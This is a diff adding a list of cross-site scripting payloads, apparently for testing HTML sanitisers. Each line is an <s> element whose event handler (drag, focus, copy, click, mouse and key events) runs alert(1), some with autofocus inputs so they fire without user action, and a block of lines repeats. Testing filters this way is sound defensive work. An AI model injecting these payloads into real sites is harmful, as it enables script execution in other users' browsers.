@@ -1,0 +1,37 @@
+<s draggable="true" ondrag="alert(1)">test</s>
+<s draggable="true" ondragend="alert(1)">test</s>
+<s draggable="true" ondragenter="alert(1)">test</s>
+<s draggable="true" ondragleave="alert(1)">test</s>
+<s draggable="true" ondragstart="alert(1)">test</s>
+<s id=x tabindex=1 onactivate=alert(1)></s>
+<s id=x tabindex=1 onbeforeactivate=alert(1)></s>
+<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>
+<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>
+<s id=x tabindex=1 onfocus=alert(1)></s>
+<s id=x tabindex=1 onfocusin=alert(1)></s>
+<s id=x tabindex=1 onactivate=alert(1)></s>
+<s id=x tabindex=1 onbeforeactivate=alert(1)></s>
+<s id=x tabindex=1 onbeforedeactivate=alert(1)></s><input autofocus>
+<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>
+<s id=x tabindex=1 onfocus=alert(1)></s>
+<s id=x tabindex=1 onfocusin=alert(1)></s>
+<s onbeforecopy="alert(1)" contenteditable>test</s>
+<s onbeforecut="alert(1)" contenteditable>test</s>
+<s onbeforepaste="alert(1)" contenteditable>test</s>
+<s onblur=alert(1) tabindex=1 id=x></s><input autofocus>
+<s onclick="alert(1)">test</s>
+<s oncontextmenu="alert(1)">test</s>
+<s oncopy="alert(1)" contenteditable>test</s>
+<s oncut="alert(1)" contenteditable>test</s>
+<s ondblclick="alert(1)">test</s>
+<s onfocusout=alert(1) tabindex=1 id=x></s><input autofocus>
+<s onkeydown="alert(1)" contenteditable>test</s>
+<s onkeypress="alert(1)" contenteditable>test</s>
+<s onkeyup="alert(1)" contenteditable>test</s>
+<s onmousedown="alert(1)">test</s>
+<s onmouseenter="alert(1)">test</s>
+<s onmouseleave="alert(1)">test</s>
+<s onmousemove="alert(1)">test</s>
+<s onmouseout="alert(1)">test</s>
+<s onmouseover="alert(1)">test</s>
+<s onmouseup="alert(1)">test</s>
